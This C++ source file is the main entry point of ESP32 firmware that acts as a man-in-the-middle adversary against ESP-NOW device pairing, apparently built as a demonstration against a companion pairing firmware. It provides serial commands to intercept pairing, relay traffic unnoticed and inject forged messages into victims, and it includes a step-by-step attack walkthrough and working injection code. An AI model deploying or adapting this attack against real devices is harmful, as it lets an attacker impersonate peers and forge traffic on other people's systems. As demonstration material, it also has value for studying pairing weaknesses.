/*
 * main.cpp (adversary)
 *
 * Entry point and serial command interface for the ESP-NOW MITM adversary.
 *
 * Serial commands (57600 baud):
 *   attack on   — enable active interception (respond to pairing broadcasts)
 *   attack off  — disable interception (passive sniff only)
 *   relay on    — enable frame relay between paired victims
 *   relay off   — disable relay (intercept silently, do not forward)
 *   status      — print current state and victim table
 *   inject <msg>— inject a forged DATA message to all paired victims
 *   help        — show command list
 *
 * Suggested demo sequence:
 *   1. Flash this firmware onto the adversary ESP32.
 *   2. Flash ESP-Pairing firmware onto Device A and Device B.
 *   3. Open three serial terminals (one per device).
 *   4. On adversary: type "attack on"
 *   5. On Device A:  type "pair"
 *      → Adversary intercepts; Device A reports "Pairing confirmed by peer"
 *        but it has actually paired with the adversary, not Device B.
 *   6. On Device B:  type "pair"
 *      → Same interception; Device B also paired with adversary.
 *   7. On adversary: type "relay on"
 *   8. On Device A:  type "send hello"
 *      → Adversary prints "[intercept] DATA from A: hello"
 *      → Relay forwards the frame; Device B prints "[data] From A: hello"
 *        The communication looks normal to both victims.
 *   9. On adversary: type "inject pwned"
 *      → Both Device A and Device B receive a forged message.
 */

#include <Arduino.h>
#include <string.h>
#include <esp_now.h>
#include "config.h"
#include "crypto.h"
#include "mitm.h"

static char s_cmd_buf[128];
static int  s_cmd_len = 0;

static void handle_command(const char *cmd) {

    if (strcmp(cmd, "attack on") == 0) {
        mitm_set_attack(true);

    } else if (strcmp(cmd, "attack off") == 0) {
        mitm_set_attack(false);

    } else if (strcmp(cmd, "relay on") == 0) {
        mitm_set_relay(true);

    } else if (strcmp(cmd, "relay off") == 0) {
        mitm_set_relay(false);

    } else if (strcmp(cmd, "status") == 0) {
        mitm_print_status();

    } else if (strncmp(cmd, "inject ", 7) == 0) {
        /*
         * Inject a forged DATA frame to every paired victim.
         * This demonstrates that once the MITM is established the adversary
         * can also originate traffic — not just relay it.  Each victim will
         * display the message as if it came from a legitimate source.
         */
        const char *msg = cmd + 7;
        size_t msg_len = strlen(msg);
        if (msg_len == 0 || msg_len > ECDH_PUBKEY_LEN) {
            Serial.println("[adv] Message must be 1-64 chars");
            return;
        }

        espnow_packet_t pkt = {};
        pkt.type = PKT_DATA;
        memcpy(pkt.mac, "\xAD\xAD\xAD\xAD\xAD\xAD", 6); // adversary sentinel MAC in payload
        pkt.payload_len = (uint16_t)msg_len;
        memcpy(pkt.payload, msg, msg_len);

        // Iterate the peer table to find encrypted (victim) entries.
        bool sent = false;
        esp_now_peer_info_t pi = {};
        bool first = true;
        while (esp_now_fetch_peer(first, &pi) == ESP_OK) {
            first = false;
            if (pi.encrypt) {
                esp_now_send(pi.peer_addr, (uint8_t *)&pkt, ESPNOW_PACKET_SIZE);
                sent = true;
            }
        }
        if (!sent) Serial.println("[adv] No paired victims to inject to");
        else       Serial.printf ("[adv] Injected: \"%s\"\n", msg);

    } else if (strcmp(cmd, "help") == 0) {
        Serial.println("Commands:");
        Serial.println("  attack on/off  — enable/disable active MITM interception");
        Serial.println("  relay on/off   — enable/disable frame relay between victims");
        Serial.println("  status         — show attack state and victim table");
        Serial.println("  inject <msg>   — inject forged message to all victims");

    } else {
        Serial.printf("Unknown command: '%s' (type 'help')\n", cmd);
    }
}

void setup() {
    Serial.begin(57600);
    delay(500);
    Serial.println("\n=== ESP-NOW MITM Adversary ===");

    if (!crypto_init()) {
        Serial.println("[FATAL] crypto init failed");
        while (1) delay(1000);
    }

    // mitm_init() also initialises ESP-NOW and registers the receive callback.
    mitm_init();

    Serial.println("Type 'help' for commands.  Type 'attack on' to begin.");
}

void loop() {
    // Non-blocking serial line reader — same pattern as the pairing firmware.
    while (Serial.available()) {
        char c = (char)Serial.read();
        if (c == '\r') continue;
        if (c == '\n') {
            s_cmd_buf[s_cmd_len] = '\0';
            if (s_cmd_len > 0) handle_command(s_cmd_buf);
            s_cmd_len = 0;
        } else if (s_cmd_len < (int)sizeof(s_cmd_buf) - 1) {
            s_cmd_buf[s_cmd_len++] = c;
        }
    }
}
